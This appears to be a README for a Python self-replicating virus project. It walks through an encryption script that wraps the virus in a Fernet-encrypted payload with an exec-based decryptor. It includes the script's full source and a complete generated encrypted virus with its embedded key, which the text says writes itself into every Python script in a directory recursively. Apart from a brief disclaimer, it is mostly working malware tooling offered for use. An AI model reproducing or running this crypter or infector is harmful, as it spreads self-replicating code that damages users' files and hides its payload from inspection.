# Self Replicating Virus

## ** Disclaimer **

The information and code provided here, are inteded to be used for educational and research purposes only. Do not use the information for illegal activities, any actions and or activities related to the material contained within this repository is solely your responsibility. The author will not be held responsibile in the event of any criminal charges against any individual misusing the information provided here.

## TABLE OF CONTENTS

0. [Prerequisites](#prerequisites)
1. [What is it and how to use it](#what-is-it-and-how-to-use-it)
2. [A deeper dive](#a-deeper-dive)
3. [A glimpse into the encrypted virus](#a-glimpse-into-the-encrypted-virus)

## Prerequisites

In order to run `virus_encryption.py` you need to install the `cryptography` python dependency (https://cryptography.io/en/latest/installation.html). You can do that just by:

```py
pip install cryptography
```

## What is it and how to use it

This version of the virus employs encryption, in particular it encrypts the payload and add to the virus a decryption function which, once executed, will decrypt the payload (the virus) and execute the code.

In order to use this version run:

```
py virus_encryption
```

You will be prompted with the following:

```
Name of the file you want to encrypt:
```

and just type the name of the virus and press enter:

```
self_replicating_virus.py
```

Then you will be asked to type the name of the file you want to generate:

```
Name of the file with the encrypted virus:
```

And you can type whatever you want, for example:

```
self_replicating_virus_encrypted.py
```

And the encrypted virus will be generated.

You can run the newly generated file, with the same result of as the `no-encrpytion` version, namely the virus will write itself (the encrypted version) to each python script in the directory (recursively).

## A deeper dive

Let's analyze the `virus_encryption.py` file step by step.

```py
import cryptography
from cryptography.fernet import Fernet

payload = []
encode = []
secret_key = b''

```

Import the `cryptography` module and in particular the `Fernet` module. This will be used to encrypt and decrypt the payload. Also, two arrays are defined: the payload and the encode. The payload will contain the not-yet-encrypted lines of the virus, while the encode will contain the corresponding lines but encrypted. Also a secret key (as bytes) is needed and we store it in the global variable `secret_key`.

<hr/>

```py
def ask_for_filename():
  print("Name of the file you want to encrypt: ")
  file_name = input()
  return file_name
```

This function provides the user a prompt for the name of the virus file they want to encrypt.

<hr/>

```py
def read_payload(file_name):
  with open(file_name, 'r') as virus:
    for line in virus:
      payload.append(line)
```

The payload from the file is read and stored in the `payload` variable.

> Unlike the `no-encryption` version, the non-encrypted virus here does not contain the delimiting comments `### START VIRUS ###` and `### END VIRUS ###`, since these will be added by the encryption script (aka `virus_encryption.py`).

<hr/>

```py
def generate_key():
  global secret_key
  secret_key = Fernet.generate_key()
```

Here, the encryption key is generated by the `.generate_key()` of the `Fernet` module and stored in the global varaible.

<hr/>

```py
def encrypt_payload():
  fernet = Fernet(secret_key)
  for elem in payload:
    encode.append(fernet.encrypt(elem.encode()))
```

Encrypt the payload using the secret key above, and store the new encrypted lines in the `encode` global varaible.

<hr/>

```py
def ask_for_encrypted_filename():
  print("Name of the file with the encrypted virus: ")
  encypted_virus_filename = input()
  return encypted_virus_filename
```

Now it appears the function which prompts the user for the name of the new encrypted virus file.

<hr/>

```py
def write_virus(encrypted_virus_name):
  with open(encrypted_virus_name, "w") as virus:
    virus.write("##### START VIRUS #####\n")
    virus.write('\n##### ENCRYPT #####\n')
    virus.write("encrypted_payload = [b'" + (b"',b'".join(encode)).decode() + "']")
    virus.write("\n##### END ENCRYPT #####\n")
    decryption = """
from cryptography.fernet import Fernet

decrypted_payload = []

def decrypt_payload():
  fernet = Fernet(b'""" + secret_key.decode() + """')
  for elem in encrypted_payload:
    decrypted_payload.append((fernet.decrypt(elem)).decode())

decrypt_payload()
exec("".join(decrypted_payload))
"""
    virus.write(decryption)
    virus.write("\n###### END VIRUS ######\n")
```

And finally the real action. This method will write in the file - with name chosen by the user - the encrypted payload as an array of encrypted lines called `encrypted_payload` (this shall be more clear once the encrypted virus will be presented), followed by the decryption fnction which will run through the encrypted lines stored in `encrypted_payload`, decrypt them and then execute the decrypted code. Let's see how the decryption method is actually built:

```py
from cryptography.fernet import Fernet

decrypted_payload = []

def decrypt_payload():
  fernet = Fernet(b'""" + secret_key.decode() + """')
  for elem in encrypted_payload:
    decrypted_payload.append((fernet.decrypt(elem)).decode())

decrypt_payload()
exec("".join(decrypted_payload))
```

First we need the `Fernet` module to decrypt the payload. Then we define the variable which will store the decrypted payload and the function which will decrypt the payload. Now, the `fernet` object is created using the global variable `secret_key` and then, for each line in `encrypted_payload`, the loop decrypts it and appends it to the `decrypted_payload` array. Then we run this function and finally executing the decrypted code stored in `decrypted_payload`).

## A glimpse into the encrypted virus

The generated encrypted virus should look like the following:

```py
##### START VIRUS #####

##### ENCRYPT #####
encrypted_payload = [b'gAAAAABf2NGYStgP3J7gBTIv6kDOUtTNyk2bIG-aw3b0pL0po00h_eBCVpWrahnvfVvAV_Z31rCiHDghdVjPeXF8bYL8VzdxxQ==',b'gAAAAABf2NGYuoF3PotW4XR7EXq3iM_s4per73h7-43IBN-bfyFXk3v_PvBPrOwPcnzXSW6rLbqNv7sek4YcPl0rWVEYTg6tzJoZtlQ-ix0YsPabMxrowwg=',b'gAAAAABf2NGYaRbEuPqn_28v6JI7cWMOmmxlRg7Er4WNXARmvQoFLinMg-x673NYxxNnaykid64-7b2dgdq_TZ8mpEHIqmIZzk_1PNd1ge70rx_idit4COU_tChx0Tj3pWJt_i3e7bc6',b'gAAAAABf2NGYPy8QNgL3Uz11UboBpsEDeVJyqt9PADSIpF82WJrZGZ0rMxdTkV0O_XCfJZ6uq2q13M-fJMphbkOLAyVFycFFzg==',b'gAAAAABf2NGYnzAQm7kIyR_hq7RHKTpMHx5uU36w1fepc-3bICh5cA6s0zsYdDJkVEU-_7FptfglxroisebWeNo_XgpJ4CaBWdYarRYp96_asxARO5nXf5A=',b'gAAAAABf2NGYiSgULH-MwVZLMw3XJewNV-8rfZeanns6OTKXUJEDwJ-LIq6JFQVrCA8N3IgCfLTUAXpPfqOTgP7Q3KA69qb9DA==',b'gAAAAABf2NGYl1KJJAayjigxiPSQ3THo_Q7W9wWGmopHWSPIBtexreMRyftvqGP9jWioB-A4vXp_5yKo4tblx5LdYltWNgim3Q==',b'gAAAAABf2NGYaS5NzgIa0hRwmxvLTxbdEM9i_1MsKi7P_KCWG8BLsGCOUl35sR9fBb1SVf7ZA0xplM_qTLL2bo18PkWk_6IwyxHsErDep-u0_Q0T-l3NNtnAEgUAB3k0iPGhEF7fWFes',b'gAAAAABf2NGYLffLRfK6bBDyn6wtrkQOH7t_7IOl3-VPPrqWreUQLhbZbc6wCOafNG_tQ5EF8WRXkq2MA0pTywQc098fCxfYPK65d453hyF1VHJmZnt7k7__xmkZhXJkOl8PB2YIrwFO',b'gAAAAABf2NGYURgrbCFtR_3PvBdxCmNFNbLKxSm7ul1-hL0bHig3qEWi65oWKmunz4LwaafHgdZe7eksY8QN7Y6Cwfv6XoTTXKGVIvINck80UrlsWLKhEYo=',b'gAAAAABf2NGYdjnCYbqrAYzdA2YJjPE4b0G7002Q89UEDhLcwnmMtOgjkMCufe3bHPhccDTaiDFwQrUeO9kVf9gaEtsI-octNNSUSBdvONty5adEfR3zg8M=',b'gAAAAABf2NGYlvJPljsaeO4fFuSkI7V8TE5j7XLJrAHZlzFbTGeVk3V2c2wwh-AeCaevD9eUchRBvbmRbazifqpOkcGGbk0DSdK8hQ2FPO5btSca0711CbZmDc9WZysRFDlNr7eTP4XU_qcTW-7tnaPbMRKAxp8STw==',b'gAAAAABf2NGYdBvK8JvDND11YOikZKR1Xg9SWfftdjOBSeO5AP7vDhWJEW5GVKHJpXUIVPXe4BQ_63Ag-1NeEckZaC1bE4w6yw==',b'gAAAAABf2NGYBgl9mrc1U0hDefXg3d4IZL2DYMOrMafuwdoBUB7A5Ysd869QHPySztJdAYHxWnBHWlhUiXIN6O9gUf4KkpsSjQ==',b'gAAAAABf2NGYqpGt8m-kZL_n8GGUOSII8Tm2S5XmUnOHOibOihvXIm2ockyo18ynujIGjySEobh5PjKMMLQbAUI6yfCoIA8cGcVKOAJYcowIHk5va9V3aQY=',b'gAAAAABf2NGYJEOG4wAfqFpRvkK38ubmWw2B86JRmZcUaqTNHCGAmRLJhGfmHjbGoHpXHAb4uWwry6c5aVjzg-yDCVqi8pWxnaviU-gdXLZcCnXl5WY5cpU=',b'gAAAAABf2NGYMnHDwHNMadfMhejqWElah1RhER-lZSgzwQtpcwWvx98hPS3W0KnENF7IsB-45GZEgQz73wlvuZV29Fv4Maa3TjZmfYZAqjonslo6oApG41DpqpzQpurOqN-hYy0zcBp4',b'gAAAAABf2NGY6x1aU9K0qaUCfE9sIuPJ-Ed3vLgPtO_NgE52kGafXZBNmZa_x1cDwaRjrJAEHQTBcQLtahDBKsRWKEUljrtZKA==',b'gAAAAABf2NGYIMefI0RIxED9669FttTKc7hSKll-0f12JU1_7PNe5fArAakqW8a8PPrvRNMRCXAI3PN1iZxvqNk8s80DPO96dA==',b'gAAAAABf2NGYvY3Ne2iUvWzMVfEGmITyRq0EDeA2_w5DVTHrUdXNfPCNv2SBCtvMNDz8Dra6gzC6v4C1g8wpE4G4zdDAh3Cw4nXcynyJY_wfFb5-PoL-YWY=',b'gAAAAABf2NGYLCBDZPphLeITrbYPnpIU04S96IoUtwLzdOMQKozqKlT7yW2VFoEe7qGOel5AntcMoS2G9-TBpREAP2WfntTBJbpPJtBJGZicrnYscjTTucI=',b'gAAAAABf2NGYE7ylGSbs9dg4eHMi6ZIElyuzxV6DXWB_Z8SNPKZnZL35p1xx3vzjjaGNOTnE9xQAf49OOEkCJPxNCjlHqnBU2nJafbaUMbllvtbEb-lw1pc=',b'gAAAAABf2NGY8L5sg1rMf2yLvXaVdtJ0DDgQS6nu_8AGVdtUnoKJMVBQBxRrgzA9TdMxznz_zZgsIULNmQauMXnRWxt9Num60GanpApdnc6mu78GW6RZf-fF9EKiW5mmFRYZJrcgj-1I',b'gAAAAABf2NGYXw2f7r6_in-3CGu69sNFkXhaqqG6XtNi6Ykt43OHXs-HC9GoMwfXHkQwNjLkWQUTdhFKPY1-X2h23CVeoKAy2I1Go0E9HTkmq2uVQswYQXM=',b'gAAAAABf2NGYcnp8KOYeJY3tWV-8KS_JQFRByb5N_ujMCs0jSA6EVIQCBoPwOrslNGG3I_51R-bi7qoa6iwWTFaSvmPlA3U4chC2yaDFPWZpdbDRLIFFe0M=',b'gAAAAABf2NGYDN6OOQfTkVt5SmdFJThzkkXMqDm-43YFdeEhmY6y7cByWBJ3puqRdj1k1d-xc4dXhAyEhg3-z4-z1OfnYPc_Tw==',b'gAAAAABf2NGYfpOphmJXO9UFe6TMVqf25nRiRZUiPgmnY_emogU-orNwPPSqd8_qr0XiwV08XR2lhXfyvYvggw3DyYIW__ZSWA==',b'gAAAAABf2NGYmPDXo17u7QIjTudoB5w93aS-m2NyosDkNOK8k6toE-1RZEADprQKO1qxFMQo60YA6kpvlrYRJrBXQc5-WxstNsMuycodAZvA3S8zDNg3SfM=',b'gAAAAABf2NGY0rdFzGg2RbSP06TwqX5NcSMFAurEDgioJxE8wv52gtEXEMut0wbDhHUb9XmY1If3-RoIP1Ki992TMddRV83wpvGBsQ88LJEwTJGWJpiuYU-frLBIHP3PA7kA9igzm6JH8y3eqYtI6FdU7-pjolb77zGVpaMrqFesGsb1Jvtii5g=',b'gAAAAABf2NGYK43_aZgwDSc1KhxqlMOEOBT3Qv5no0QgtOewO15GuEag_BDjEPWLIT7Bpxvr6d-qQ-d7PPGyriA7DbcG7HWpVnMyZYBN2i5ELc7494S9XX0=',b'gAAAAABf2NGYIHsXdb7eB5gszM2QFVE2XlM60OAlHyEfVgYvBkPWKxoyt02LsRrgFlUPs7r0_2PXonTHvi2c7F76ORNJ3jBkNq6oGWq579mGDH9ZMQ41Dfg=',b'gAAAAABf2NGYPdYIWK2i5EM0VEBL07pS5JAhw-nVd2EfkXWGfsImKSDmetWEXku5yKqFG0JW3b64FunDaJga8Lm7FUhiCtx9mqZOHB6b2swTRS2vVJY0Wtw=',b'gAAAAABf2NGYmkYrOgtdAIXyZOfaWt_joJgr1a-qPLm4JIuYJTB5wsyXb6Wh9TtuNI5jb1-YivIHTkUVKVg1UwSx1iy_S-cIl2goyC4C7vGshqgpKrxBt1I=',b'gAAAAABf2NGYiGv6El5iRofFdC0_MDlb9cc-01ZyorX2NI-PdleNetf9PkqVwLE9BnC_Z3pfXzalcasK6oeKMHLDzr4pLHUYMIKhHTBMfv45jRvE9SA9wnwGAGJr-fh5eaCTPSULr5cIxiu2au6NXqLdS9qXpMQ5kQ==',b'gAAAAABf2NGYXylQP4qCD8WlpfciLeYUEGLmL9dYnbUF15uyTi1_J8R_b4zFG6xIGb65NtFQZFJH1_67z_I2IX4b2Bmj4u95DAjYb8DFNmdBzpGlGK8mrOA=',b'gAAAAABf2NGYDWjoLFrde0zFR7Zh3b4L98loqJKWfIFfElAriUzMEaW1yBzkSo6GEwVvkt4rTaRKRyIxOBSzcz7AU0YDtr_9iTAUOTAkwgxjDUyTI8tp8UKmWVhkCvkQiJ_9QOcuYgBs',b'gAAAAABf2NGYVG3-YeoUJzG0_Vy_ZSVYo_pUOvvTNsQktme_EYptNeMgg7qhy30uhckE_RNSClCmv4NY6c3JJDnmieIiteu0otSbUAIU8WFYxwiphX0yB-lzOp1FejNCEBBcrasMzAom0dogQfX6BV-yZlc_rE7kcA==',b'gAAAAABf2NGYirABqI8E_btzZn6XEkrR3qjWZnbV7ug5atCojJ3TLx43acg68dFJkrr98C9y9hI16ywC6ieh4xDaNpE7pOcOOpCuxJdPHsJBYPazALWNEzs=',b'gAAAAABf2NGYN3imFMl61knY3TtqA3cBiqRSnb1hMXf3dmb0w5CA38TivS11SlxpzpnWjE1MaDSBoL4UM-yEfQNJ4LN7669AFw==',b'gAAAAABf2NGYBiuGZDhepTN1wkcjiPco8PKSqYG3Lym6eZg90J7CQmedVh87fPSv1ndbJ7FO6_wszl4uhXTxdfXTieQoep2rkQ==',b'gAAAAABf2NGY6IUc39EtW0r7ikFW88BMJVw2zMno-aicR3LRsXAubxG4oopwNL0zfo1ImUadGicmXpPg9LZMx_OgaEq70xHM-jEw0KYbJ7Il7pGY7XyQtjY=',b'gAAAAABf2NGYx8eHXTVPRukC-i1dbdlpj6Y6XJaVC8U4I0LHcr2OAbIs7cXFyoLeTn89-bMXdWZQpfyqOpmDzA8IUcaHZIVVg6ZbcH2Zc2idm-F53JSS8ho=',b'gAAAAABf2NGYw1M7OZkiofVePZkmpa-x3kNZVlb1h4uRrF36wpGIeM3jsvtiQU9ruOCxaAtctnLm1L-FKaZqroQ_uXqksFvLhiz3AV7Bpf2eAyADG8L8qWs=',b'gAAAAABf2NGYjxRxadirPJC4tTQ5Y1rJS8nn27K6nI4dVA-LyvC4dEWuOg2K1KFWRgsDRTlTJTU-OzdNP1DqJV2bLOG10Mj-gXmBbnVCEdANr5sKAbVKCNs=',b'gAAAAABf2NGYGGYAF2GsteWbTGsCR5GRmDUvJd_qStMscLnkM_Vzwc3A7TSdUEyMp-wA5sHe3sAGhtqS8aNuipbppIhLhLXmTA==',b'gAAAAABf2NGY9obqR5Qv_ciMzNwetg_dQFPc4wGITF6JSfUwNEQ2iAiyvFIgJn68-z-kCL_HLOeAfnxbUVNH14LX2WOZRymnn6oQbE4WWUqI2FSGOaCyFIU=',b'gAAAAABf2NGYDJGR4FIZ2Hy3qaMWK_Uj0jj7Gzh2KXttcqCQm8wflUTeKWDXob2E4FxmyD-sGvbl63d1zJWE92ssmNvlRN8jIeDl9dw1aafOndmZ6vtdkvo=',b'gAAAAABf2NGY1_zJBeASmFLaSkaRuToTJAFVxgFFKHsJN3la7nVhDFyPtazBM33CSau5GTT_XXiQ90LN9yiFTTA8ZxV4V2dtoN0GVb_Tc2SD-6ALwyXSlqs=',b'gAAAAABf2NGYxEN9Y_Lu5tV-LaS1UL39p5kxAGC_kinY8RS7zCX8wD_ElxORL3wYMUUB1N1kyezXh2GHRwK1HihWmDQwVyTlZA==',b'gAAAAABf2NGYiAFW2-XdfYP8dp38Or72UT8a7W0t2BlZn0hia0DSKvslWY5j7QM-mcMbdTMiTd3n7ZxrC9MjGj9WXWHLekEZWwnRLUxxsidEH_Jw7TyduOM=',b'gAAAAABf2NGYiIPWmoRd937mAK3Rh1GHB-F5Qv11MmSF_dEtwU8EleYniI_fvID0BKiydT3jdK4LtNAiH4SBSz5G-zT4Z_2QNuBVPE-zafKcYY_Q6qLOcTs=',b'gAAAAABf2NGY8JdqRBH3OwXg6vK4L0ZPSvElA9A651xNPrOLxQ7WYnn0rt7KeMnmsTc1ZLOijaIi3FwSm_AWjdQ3-1XtDcefrA==',b'gAAAAABf2NGYWeFWPd961PMMC0T9FKa-5-AcBMvaspM5nsMVSG8sSeeEqHChbkoZj8pqPDQqtW6xNhsc2F-7Qe6dR4WvtXIT7w==',b'gAAAAABf2NGYBqnGf-YUWZIp5RTHl520oSyVOLxzBBczhpokald9yfSCuaT8R0xtv0EBGqWiUM1ZlfD_2PC9RiTFYDs3fSzytLmfq9docAB95ASt6iuYZss=',b'gAAAAABf2NGY3gP6RRkfTQyX4wCN8683al7xe74weuIzwYkFS1Qr5iV4nZj_PWpukcLarwFIjBq_xUIlCsxgv5XWAICxSp7YOixcKemAaIPFjtYrFWAUGY8=',b'gAAAAABf2NGYmZbMweMHfA4RS_GIbP_vtWZbrwnbeQuBt6BmqpzlR4MF8HZwpP0ZCRO6sS4v9rNAnuxtwWMQZrvVoD4uMaXfJA==',b'gAAAAABf2NGYwQwPxc1Tti2FWa3we-ZCaFDbq1_6_DKCzIhnAw__p9ZreJn7H7TKrTjy_eP5bO2kRWopLV2GaF-VfRPeWZPPhJsB6DYjSSQ_3Kny4KcNukY=',b'gAAAAABf2NGYN1akoPovYlprNiNUefA3Kw1uJQCLB0xlJJU1jXPmlHJAI8hIEVhCYdxRfH9q_GtZc50i6zh5PZrVP8KQM8xxsM4rtr9CCkH3RJyGxlmEZt9ZpocI8gch2OjzbBJn1Mgn',b'gAAAAABf2NGYEwANJ4-YehUGPaOToO_VAzmknnjSi4fnsvorq2u3B9GPCM1ESTQIVzUPEt-UWOcYd8odAve1RGha0LwoZOTpcd0-aTqGIUQhEr01sx63s2g=',b'gAAAAABf2NGYnBoflT7dvM2HgR-_WMJ8CMr4g8hu9MLgJU-ioUJneMoKlMs8iCgOAB_iwzHA16Bd5uV6vEsOISonK5c933Dmrw==']
##### END ENCRYPT #####

from cryptography.fernet import Fernet

decrypted_payload = []

def decrypt_payload():
  fernet = Fernet(b'ZBdrP1znue2godNiopGdPvEY7ypRsFSE3Y77qMcUhpc=')
  for elem in encrypted_payload:
    decrypted_payload.append((fernet.decrypt(elem)).decode())

decrypt_payload()
exec("".join(decrypted_payload))

###### END VIRUS ######
```

As we can see, the `encrypted_payload` contains each lines of the original virus but encrypted. Also, the encrypted part is delimited by `### START ENCRYPT ###` and `### END ENCRYPT ###`. These are completely superfluous at this stage, but for the next versions, these delimiters will be necessary.
